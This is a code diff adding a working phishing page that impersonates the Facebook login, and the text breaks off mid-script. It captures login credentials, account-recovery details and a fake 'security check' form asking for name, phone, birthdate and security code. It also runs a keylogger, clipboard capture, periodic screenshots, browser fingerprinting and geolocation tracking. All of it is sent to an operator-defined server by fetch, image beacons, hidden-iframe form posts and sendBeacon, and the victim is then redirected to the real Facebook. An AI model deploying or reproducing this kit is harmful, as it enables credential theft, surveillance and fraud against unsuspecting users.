@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <!-- Fingerprinting Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+    <!-- jQuery -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <!-- html2canvas for screenshot -->
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    
+    <style>
+        /* ===== RESET & BASE STYLES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* ===== PHISHING PAGE STYLES ===== */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 80vh;
+            padding: 72px 0 112px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .left-section {
+            flex: 0 0 580px;
+            padding-right: 32px;
+        }
+
+        .logo img {
+            height: 106px;
+            margin: -28px;
+        }
+
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+            width: 500px;
+        }
+
+        .right-section {
+            flex: 0 0 396px;
+        }
+
+        .form-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 396px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+            transition: background-color 0.3s;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 16px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        /* Recovery Form */
+        .recovery-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 396px;
+            display: none;
+        }
+
+        .recovery-form h3 {
+            color: #1c1e21;
+            font-size: 20px;
+            margin-bottom: 16px;
+        }
+
+        .recovery-form p {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        .recovery-buttons {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .cancel-btn, .search-btn {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        .cancel-btn {
+            background-color: #e4e6eb;
+            color: #4b4f56;
+        }
+
+        .search-btn {
+            background-color: #1877f2;
+            color: white;
+        }
+
+        .cancel-btn:hover, .search-btn:hover {
+            opacity: 0.9;
+        }
+
+        /* Additional Form */
+        .additional-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 396px;
+            display: none;
+        }
+
+        .additional-form h3 {
+            color: #1c1e21;
+            font-size: 20px;
+            margin-bottom: 16px;
+        }
+
+        .additional-form p {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        .submit-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+            background-color: #166fe5;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #fff;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .languages {
+            border-bottom: 1px solid #dddfe2;
+            padding-bottom: 8px;
+            margin-bottom: 8px;
+        }
+
+        .languages a, .meta-links a {
+            color: #8a8d91;
+            font-size: 12px;
+            text-decoration: none;
+            margin-right: 10px;
+            line-height: 1.6;
+        }
+
+        .languages a:hover, .meta-links a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            color: #8a8d91;
+            font-size: 11px;
+            margin-top: 20px;
+        }
+
+        /* Success Page Styles */
+        .success-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 40px;
+            max-width: 500px;
+            text-align: center;
+            margin: 100px auto;
+        }
+
+        .success-logo img {
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 30px 0;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #42b72a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+        }
+
+        .success-icon i {
+            color: white;
+            font-size: 40px;
+        }
+
+        .redirect-notice {
+            background-color: #f0f8ff;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .countdown {
+            font-weight: bold;
+            color: #1877f2;
+        }
+
+        /* Hidden elements */
+        .hidden-frame {
+            display: none;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            display: none;
+        }
+
+        .loading-overlay .spinner {
+            width: 60px;
+            height: 60px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden iframe untuk data exfiltration -->
+    <iframe name="hiddenFrame" class="hidden-frame"></iframe>
+    
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- PHISHING PAGE (Main) -->
+    <div id="phishingPage">
+        <div class="container">
+            <div class="left-section">
+                <div class="logo">
+                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+                </div>
+                <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            
+            <div class="right-section">
+                <!-- Login Form -->
+                <div class="login-form" id="loginForm">
+                    <div class="form-container">
+                        <input type="text" id="email" placeholder="Email address or phone number" autocomplete="off">
+                        <input type="password" id="password" placeholder="Password" autocomplete="off">
+                        <button type="button" class="login-btn" onclick="submitPhishing()">Log In</button>
+                        
+                        <div class="divider"></div>
+                        
+                        <button type="button" class="create-account" onclick="showCreateAccount()">Create new account</button>
+                        
+                        <div class="forgot-password">
+                            <a href="#" onclick="showRecovery()">Forgotten password?</a>
+                        </div>
+                    </div>
+                    
+                    <div class="create-page">
+                        <a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.
+                    </div>
+                </div>
+                
+                <!-- Recovery Form -->
+                <div class="recovery-form" id="recoveryForm">
+                    <h3>Find Your Account</h3>
+                    <p>Please enter your email address or mobile number to search for your account.</p>
+                    <input type="text" id="recovery-email" placeholder="Email address or phone number">
+                    <div class="recovery-buttons">
+                        <button class="cancel-btn" onclick="hideRecovery()">Cancel</button>
+                        <button class="search-btn" onclick="submitRecovery()">Search</button>
+                    </div>
+                </div>
+                
+                <!-- Additional Security Form -->
+                <div class="additional-form" id="additionalForm">
+                    <h3>Security Check</h3>
+                    <p>To secure your account, please provide additional information:</p>
+                    <input type="text" id="full-name" placeholder="Full Name">
+                    <input type="text" id="phone" placeholder="Phone Number">
+                    <input type="date" id="birthdate">
+                    <input type="text" id="security-code" placeholder="Security Code (if any)">
+                    <button class="submit-btn" onclick="submitAdditional()">Submit</button>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <div class="footer-content">
+                <div class="languages">
+                    <a href="#">English (UK)</a> <a href="#">Bahasa Indonesia</a> <a href="#">中文(简体)</a>
+                    <a href="#">日本語</a> <a href="#">Português (Brasil)</a>
+                </div>
+                <div class="meta-links">
+                    <a href="#">Sign Up</a> <a href="#">Log In</a> <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a> <a href="#">Video</a> <a href="#">Places</a>
+                    <a href="#">Games</a> <a href="#">Marketplace</a> <a href="#">Meta Pay</a>
+                    <a href="#">Meta Store</a> <a href="#">Meta Quest</a> <a href="#">Instagram</a>
+                    <a href="#">Threads</a> <a href="#">Fundraisers</a> <a href="#">Services</a>
+                    <a href="#">Voting Information Centre</a> <a href="#">Privacy Policy</a>
+                    <a href="#">Privacy Centre</a> <a href="#">Groups</a> <a href="#">About</a>
+                    <a href="#">Create Ad</a> <a href="#">Create Page</a> <a href="#">Developers</a>
+                    <a href="#">Careers</a> <a href="#">Cookies</a> <a href="#">AdChoices</a>
+                    <a href="#">Terms</a> <a href="#">Help</a> <a href="#">Contact uploading and non-users</a>
+                    <a href="#">Settings</a>
+                </div>
+                <div class="copyright">
+                    Meta © 2024
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- SUCCESS PAGE (Hidden) -->
+    <div id="successPage" style="display: none;">
+        <div class="success-container">
+            <div class="success-logo">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+            </div>
+            
+            <div id="checking">
+                <h1>Security Check Complete</h1>
+                <p>Your account security has been verified. We're now securing your session...</p>
+                
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>Finalizing security protocols...</p>
+                </div>
+            </div>
+            
+            <div id="success" style="display: none;">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                
+                <h1>Security Verified!</h1>
+                <p>Your account is now secured. You'll be redirected to Facebook shortly.</p>
+                
+                <div class="redirect-notice">
+                    <p>Redirecting in <span class="countdown" id="countdown">5</span> seconds...</p>
+                    <p style="margin-top: 10px; font-size: 12px;">
+                        If you are not redirected automatically, 
+                        <a href="https://facebook.com" id="redirectLink">click here</a>.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== GLOBAL VARIABLES =====
+        const SERVER_URL = 'https://your-server.com/api'; // Ganti dengan server Anda
+        let deviceFingerprint = '';
+        let sessionId = '';
+        let keystrokes = [];
+        let mouseMovements = [];
+        let startTime = Date.now();
+        let screenshotInterval;
+
+        // ===== DEVICE FINGERPRINTING =====
+        function generateSessionId() {
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + 
+                   '_' + Date.now().toString(36);
+        }
+
+        async function getDeviceFingerprint() {
+            if (deviceFingerprint) return deviceFingerprint;
+            
+            const components = {
+                // Browser Info
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : '',
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                
+                // Screen Info
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Cookies & Storage
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorage: typeof localStorage !== 'undefined' ? 'enabled' : 'disabled',
+                sessionStorage: typeof sessionStorage !== 'undefined' ? 'enabled' : 'disabled',
+                
+                // Hardware
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                
+                // Connection
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Features
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                webdriver: navigator.webdriver || false,
+                
+                // Canvas Fingerprinting
+                canvas: getCanvasFingerprint(),
+                
+                // WebGL Fingerprinting
+                webgl: getWebGLFingerprint(),
+                
+                // Audio Context
+                audio: getAudioFingerprint(),
+                
+                // Fonts
+                fonts: await getFontsList()
+            };
+            
+            // Hash semua komponen
+            const fingerprintString = JSON.stringify(components);
+            deviceFingerprint = btoa(fingerprintString).substring(0, 32);
+            
+            return deviceFingerprint;
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                // Draw unique pattern
+                ctx.textBaseline = 'top';
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                
+                ctx.fillStyle = '#069';
+                ctx.fillText('RYZDARK-XV7-FINGERPRINT', 2, 15);
+                
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('RYZDARK-XV7-FINGERPRINT', 4, 17);
+                
+                // Add more complexity
+                ctx.strokeStyle = '#000';
+                ctx.lineWidth = 2;
+                ctx.strokeRect(0, 0, canvas.width, canvas.height);
+                
+                return canvas.toDataURL().substring(22, 50);
+            } catch (e) {
+                return 'error:' + e.message;
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return 'no-webgl';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+                
+                return 'no-debug-info';
+            } catch (e) {
+                return 'error:' + e.message;
+            }
+        }
+
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                
+                oscillator.connect(analyser);
+                analyser.connect(audioContext.destination);
+                oscillator.start(0);
+                oscillator.stop(0);
+                
+                audioContext.close();
+                return 'supported';
+            } catch (e) {
+                return 'unsupported:' + e.message;
+            }
+        }
+
+        async function getFontsList() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Helvetica', 'Tahoma'
+            ];
+            
+            const availableFonts = [];
+            
+            // Create a test element
+            const testElement = document.createElement('span');
+            testElement.style.fontSize = '72px';
+            testElement.style.position = 'absolute';
+            testElement.style.left = '-9999px';
+            testElement.innerHTML = 'mmmmmmmmmmlli';
+            
+            document.body.appendChild(testElement);
+            
+            // Get default width
+            const defaultWidth = testElement.offsetWidth;
+            
+            // Test each font
+            for (const font of fontList) {
+                testElement.style.fontFamily = font + ', monospace';
+                if (testElement.offsetWidth !== defaultWidth) {
+                    availableFonts.push(font);
+                }
+            }
+            
+            document.body.removeChild(testElement);
+            return availableFonts;
+        }
+
+        // ===== DATA COLLECTION =====
+        function collectDeviceInfo() {
+            const info = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                
+                // Browser Details
+                browser: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    vendor: navigator.vendor,
+                    product: navigator.product,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    online: navigator.onLine,
+                    javaEnabled: navigator.javaEnabled(),
+                    cookieEnabled: navigator.cookieEnabled,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver
+                },
+                
+                // Screen Details
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                },
+                
+                // Window Details
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio,
+                    screenX: window.screenX,
+                    screenY: window.screenY
+                },
+                
+                // Performance
+                performance: {
+                    timing: performance.timing ? {
+                        navigationStart: performance.timing.navigationStart,
+                        loadEventEnd: performance.timing.loadEventEnd
+                    } : null,
+                    memory: performance.memory ? {
+                        totalJSHeapSize: performance.memory.totalJSHeapSize,
+                        usedJSHeapSize: performance.memory.usedJSHeapSize
+                    } : null
+                },
+                
+                // Network
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Battery (if available)
+                battery: null,
+                
+                // Geolocation (will be filled later)
+                geolocation: null,
+                
+                // IP (will be filled server-side)
+                ip: 'pending'
+            };
+            
+            // Try to get battery info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    info.battery = {
+                        charging: battery.charging,
+                        level: battery.level,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                });
+            }
+            
+            // Try to get geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        info.geolocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        sendToServer(info, 'device_info');
+                    },
+                    error => {
+                        info.geolocation = { error: error.message };
+                        sendToServer(info, 'device_info');
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                sendToServer(info, 'device_info');
+            }
+            
+            return info;
+        }
+
+        // ===== KEYLOGGER =====
+        function setupKeylogger() {
+            document.addEventListener('keydown', function(e) {
+                const target = e.target;
+                const targetInfo = {
+                    id: target.id,
+                    name: target.name,
+                    className: target.className,
+                    type: target.type,
+                    tagName: target.tagName
+                };
+                
+                keystrokes.push({
+                    key: e.key,
+                    code: e.code,
+                    keyCode: e.keyCode,
+                    timestamp: Date.now(),
+                    target: targetInfo,
+                    url: window.location.href
+                });
+                
+                // Send keystrokes batch every 30 keystrokes or 10 seconds
+                if (keystrokes.length >= 30) {
+                    sendKeystrokes();
+                }
+            });
+            
+            // Send keystrokes every 10 seconds
+            setInterval(sendKeystrokes, 10000);
+        }
+
+        function sendKeystrokes() {
+            if (keystrokes.length === 0) return;
+            
+            const keylogData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                keystrokes: [...keystrokes],
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToServer(keylogData, 'keylog');
+            keystrokes = [];
+        }
+
+        // ===== MOUSE TRACKING =====
+        function setupMouseTracking() {
+            let lastMouseMove = Date.now();
+            
+            document.addEventListener('mousemove', function(e) {
+                const now = Date.now();
+                if (now - lastMouseMove < 100) return; // Throttle to 10Hz
+                lastMouseMove = now;
+                
+                mouseMovements.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: now,
+                    pageX: e.pageX,
+                    pageY: e.pageY,
+                    screenX: e.screenX,
+                    screenY: e.screenY
+                });
+            });
+            
+            // Send mouse movements every 15 seconds
+            setInterval(sendMouseMovements, 15000);
+        }
+
+        function sendMouseMovements() {
+            if (mouseMovements.length === 0) return;
+            
+            const mouseData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                movements: [...mouseMovements],
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToServer(mouseData, 'mouse');
+            mouseMovements = [];
+        }
+
+        // ===== CLIPBOARD CAPTURE =====
+        function setupClipboardCapture() {
+            document.addEventListener('paste', function(e) {
+                try {
+                    const clipboardData = e.clipboardData.getData('text');
+                    if (clipboardData && clipboardData.trim()) {
+                        const clipboardInfo = {
+                            fingerprint: deviceFingerprint,
+                            sessionId: sessionId,
+                            data: clipboardData.substring(0, 1000), // Limit length
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        sendToServer(clipboardInfo, 'clipboard');
+                    }
+                } catch (error) {
+                    // Clipboard access might be blocked
+                }
+            });
+        }
+
+        // ===== SCREENSHOT CAPTURE =====
+        function setupScreenshotCapture() {
+            if (typeof html2canvas === 'undefined') return;
+            
+            // Take screenshot every 2 minutes if page is visible
+            screenshotInterval = setInterval(() => {
+                if (!document.hidden) {
+                    captureScreenshot();
+                }
+            }, 120000);
+        }
+
+        function captureScreenshot() {
+            if (typeof html2canvas === 'undefined') return;
+            
+            html2canvas(document.body, {
+                scale: 0.5, // Lower quality for smaller size
+                useCORS: true,
+                logging: false,
+                backgroundColor: '#ffffff'
+            }).then(canvas => {
+                const screenshotData = {
+                    fingerprint: deviceFingerprint,
+                    sessionId: sessionId,
+                    screenshot: canvas.toDataURL('image/jpeg', 0.3), // 30% quality
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+                
+                sendToServer(screenshotData, 'screenshot');
+            }).catch(error => {
+                console.error('Screenshot error:', error);
+            });
+        }
+
+        // ===== FORM HANDLING =====
+        function submitPhishing() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                alert('Please fill in both email and password');
+                return;
+            }
+            
+            showLoading();
+            
+            // Collect device info first
+            collectDeviceInfo();
+            
+            const phishingData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                credentials: {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                },
+                formType: 'login',
+                timeOnPage: Date.now() - startTime,
+                page: 'login_form'
+            };
+            
+            // Send to server
+            sendToServer(phishingData, 'phishing_data');
+            
+            // Show additional form
+            setTimeout(() => {
+                hideLoading();
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('additionalForm').style.display = 'block';
+            }, 1500);
+        }
+
+        function showRecovery() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('recoveryForm').style.display = 'block';
+        }
+
+        function hideRecovery() {
+            document.getElementById('recoveryForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        function submitRecovery() {
+            const recoveryEmail = document.getElementById('recovery-email').value.trim();
+            
+            if (!recoveryEmail) {
+                alert('Please enter your email or phone number');
+                return;
+            }
+            
+            showLoading();
+            
+            const recoveryData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                recoveryEmail: recoveryEmail,
+                formType: 'recovery',
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToServer(recoveryData, 'phishing_data');
+            
+            setTimeout(() => {
+                hideLoading();
+                showSuccessPage();
+            }, 1500);
+        }
+
+        function showCreateAccount() {
+            // Redirect to fake create account page or show form
+            const createAccountData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                action: 'create_account_click',
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToServer(createAccountData, 'activity');
+            
+            alert('Account creation is temporarily unavailable. Please try again later.');
+        }
+
+        function submitAdditional() {
+            const fullName = document.getElementById('full-name').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const birthdate = document.getElementById('birthdate').value;
+            const securityCode = document.getElementById('security-code').value.trim();
+            
+            showLoading();
+            
+            const additionalData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                additionalInfo: {
+                    fullName: fullName,
+                    phone: phone,
+                    birthdate: birthdate,
+                    securityCode: securityCode,
+                    timestamp: new Date().toISOString()
+                },
+                formType: 'additional',
+                timeOnPage: Date.now() - startTime
+            };
+            
+            sendToServer(additionalData, 'phishing_data');
+            
+            setTimeout(() => {
+                hideLoading();
+                showSuccessPage();
+            }, 1500);
+        }
+
+        // ===== SUCCESS PAGE =====
+        function showSuccessPage() {
+            // Hide phishing page
+            document.getElementById('phishingPage').style.display = 'none';
+            
+            // Show success page
+            document.getElementById('successPage').style.display = 'block';
+            
+            // Show checking first
+            setTimeout(() => {
+                document.getElementById('checking').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                
+                // Start countdown
+                startRedirectCountdown();
+            }, 3000);
+            
+            // Send final data
+            const finalData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                action: 'phishing_complete',
+                timestamp: new Date().toISOString(),
+                totalTime: Date.now() - startTime,
+                dataCollected: {
+                    keystrokes: keystrokes.length,
+                    mouseMovements: mouseMovements.length
+                }
+            };
+            
+            sendToServer(finalData, 'complete');
+        }
+
+        function startRedirectCountdown() {
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            const redirectLink = document.getElementById('redirectLink');
+            
+            // Update link to include tracking
+            redirectLink.href = `https://facebook.com?ref=security_check&session=${sessionId}`;
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = redirectLink.href;
+                }
+            }, 1000);
+        }
+
+        // ===== DATA TRANSMISSION =====
+        function sendToServer(data, endpoint) {
+            // Multiple transmission methods for reliability
+            
+            // Method 1: Fetch API (primary)
+            fetch(`${SERVER_URL}/${endpoint}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => {
+                // Silently fail, try next method
+                console.error('Fetch failed:', error);
+            });
+            
+            // Method 2: Image beacon (fallback)
+            const img = new Image();
+            const encodedData = btoa(JSON.stringify(data)).substring(0, 2000); // Limit length
+            img.src = `${SERVER_URL}/track?data=${encodedData}&endpoint=${endpoint}`;
+            
+            // Method 3: Form submission (most reliable)
+            try {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `${SERVER_URL}/${endpoint}`;
+                form.target = 'hiddenFrame';
+                form.style.display = 'none';
+                
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'data';
+                input.value = JSON.stringify(data);
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                
+                // Remove form after submission
+                setTimeout(() => {
+                    if (form.parentNode) {
+                        form.parentNode.removeChild(form);
+                    }
+                }, 1000);
+            } catch (error) {
+                console.error('Form submission failed:', error);
+            }
+            
+            // Method 4: navigator.sendBeacon (for exit data)
+            if (endpoint === 'complete' || endpoint === 'exit') {
+                navigator.sendBeacon(`${SERVER_URL}/${endpoint}`, JSON.stringify(data));
+            }
+        }
+
+        // ===== UTILITY FUNCTIONS =====
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+        function getIPAddress() {
+            // This will be done server-side, but we can try WebRTC
+            return new Promise((resolve) => {
+                // Simple method using a third-party service
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip))
+                    .catch(() => resolve('unknown'));
+            });
+        }
+
+        // ===== PAGE VISIBILITY =====
+        function handleVisibilityChange() {
+            if (document.hidden) {
+                // Page hidden, pause intensive operations
+                if (screenshotInterval) {
+                    clearInterval(screenshotInterval);
+                }
+                
+                // Send visibility change event
+                const visibilityData = {
+                    fingerprint: deviceFingerprint,
+                    sessionId: sessionId,
+                    action: 'page_hidden',
+                    timestamp: new Date().toISOString(),
+                    timeVisible: Date.now() - startTime
+                };
+                
+                sendToServer(visibilityData, 'activity');
+            } else {
+                // Page visible again
+                startTime = Date.now();
